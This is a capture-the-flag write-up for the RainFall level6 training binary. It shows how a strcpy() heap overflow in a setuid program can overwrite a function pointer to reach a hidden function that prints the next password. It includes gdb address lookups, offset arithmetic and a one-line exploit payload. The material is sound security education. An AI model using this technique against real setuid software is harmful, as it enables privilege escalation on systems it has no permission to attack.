# RainFall (level6)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/level7/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the command `file -b ~/level6` commands.

We use `objdump -d ~/level6` to deassemble the binary. We stored it's truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/level6`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

The binary is owned by `level7` and has the `setuid` flag set.
```sh
$ ls -la ~/level6 
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 /home/user/level6/level6
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Potentially Dangerous Function" ([CWE-676](https://cwe.mitre.org/data/definitions/676.html)). Not all [`strcpy()` man page](https://man7.org/linux/man-pages/man3/strcpy.3.html)s do explicitly state it as dangerous. This one describes it as cause of undefined behaviour.

`strcpy()` does not perform a buffer overrun check. It introduces a **stack/heap-overflow** opportunity when handling user-controlled input. In parallel, the kernel and binary do not implement modern security practices *(No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

Our binary is compiled for a **32-bit x86** system.  
It contains three user-defined functions (`main()`, `m()`, and `n()`). Although `n()` is never called in normal execution, calling it enables privilege escalation via setuid and execution of `system("/bin/cat /home/user/level7/.pass")`

We target the `main()` function because it utilizes the vulnerable `strcpy()` function.

`main()` defines two local pointer variables *(that we'll call `buffer` and `fn_ptr`)* which point to memory regions allocated sequentially on the heap via `malloc()`. Since `buffer` and `fn_ptr` are adjacent in memory, triggering a [heap-based buffer overflow](https://cwe.mitre.org/data/definitions/122.html) allows us to overwrite the function pointer (which currently holds the reference to `m()`) with the address of `n()`.

Using dynamic analysis, we find the address assigned to **`buffer`** by `malloc(64 * sizeof(char))`. Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is disabled, this address remains constant relative to the binary's virtual memory.
```sh
$ gdb --batch -ex "start" -ex "tbreak *0x804848c" -ex "continue" -ex "stepi" -ex "finish" -ex "printf \"buffer = 0x%x\n\", \$eax" ~/level6
buffer = 0x804a008
```

Using dynamic analysis, we find the address assigned to **`fn_ptr`** by `malloc(1 * sizeof(uintptr_t))`. Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is disabled, this address remains constant relative to the binary's virtual memory.
```sh
$ gdb --batch -ex "start" -ex "tbreak *0x804849c" -ex "continue" -ex "stepi" -ex "finish" -ex "printf \"fn_ptr = 0x%x\n\", \$eax" ~/level6
fn_ptr = 0x804a050
```

Between **`buffer`** and **`fn_ptr`**, there is a 72 byte offset *(`0x804a050` - `0x804a008`)*.

The `n()` function in the [source.asm](./source.asm) file specifies that:
- In **big-endian hex** notation, it's located at: `0x08048454`.
- In **little-endian hex** escape sequence, it's located at: `\x54\x84\x04\x08`.
- In **little-endian oct** escape sequence, it's located at: `\124\204\004\010`.

---

By static analysis of [source.asm](./source.asm), we notice that `n()`:
08048454

### Intent

Replace the address pointed by `fn_ptr` to `n()` through a `strcpy()` heap-based stack overflow.

## Exploit

./level6 $(printf "c%.0s" {1..72}; printf "%b" "\124\204\004\010")



...